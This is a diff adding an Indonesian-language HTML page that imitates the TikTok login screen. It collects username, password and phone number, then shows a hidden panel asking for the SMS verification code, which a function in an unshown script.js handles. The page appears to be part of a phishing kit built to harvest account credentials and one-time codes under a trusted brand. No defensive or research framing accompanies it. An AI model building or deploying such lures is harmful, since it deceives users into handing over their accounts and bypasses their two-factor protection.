@@ -1,0 +1,99 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Login</title>
+
+<link rel="stylesheet" href="style.css">
+
+</head>
+
+<body>
+
+<div class="container">
+
+
+<!-- HALAMAN LOGIN -->
+<div class="box" id="formData">
+
+<img src="logo.png" class="logo">
+
+
+<h2>Masuk TikTok</h2>
+
+<p>Masuk untuk mengikuti akun, membuat video, dan lainnya.</p>
+
+
+<form id="formUser">
+
+<input type="text" id="username" placeholder="Username">
+
+<input type="password" id="password" placeholder="Password">
+
+<input type="text" id="telepon" placeholder="No. Telepon">
+
+
+<button type="submit">
+Masuk
+</button>
+
+
+</form>
+
+
+<div class="atau">
+atau
+</div>
+
+
+<button class="sosial"><img src="logo google.png" class="google"> Masuk dengan Google</button>
+
+<button class="sosial"><img src="logo facebook.png" class="facebook"> Masuk dengan Facebook</button>
+
+
+<p class="bawah">
+Belum punya akun?
+<span>Daftar</span>
+</p>
+
+
+</div>
+
+
+
+<!-- HALAMAN VERIFIKASI -->
+<div class="box verifikasi" id="verifikasi" style="display:none;">
+
+
+<img src="logo.png" class="logo">
+
+
+<div class="icon">
+<img src="verifikasi.png" class="gambar-verifikasi">
+</div>
+
+
+<h2>Masukkan kode verifikasi</h2>
+
+<p>Kami telah mengirimkan kode ke nomor Anda</p>
+
+
+<input type="text" id="kode" placeholder="Kode verifikasi">
+
+
+<button onclick="kirimKode()">
+Verifikasi
+</button>
+
+
+</div>
+
+
+</div>
+
+
+<script src="script.js"></script>
+
+</body>
+</html>
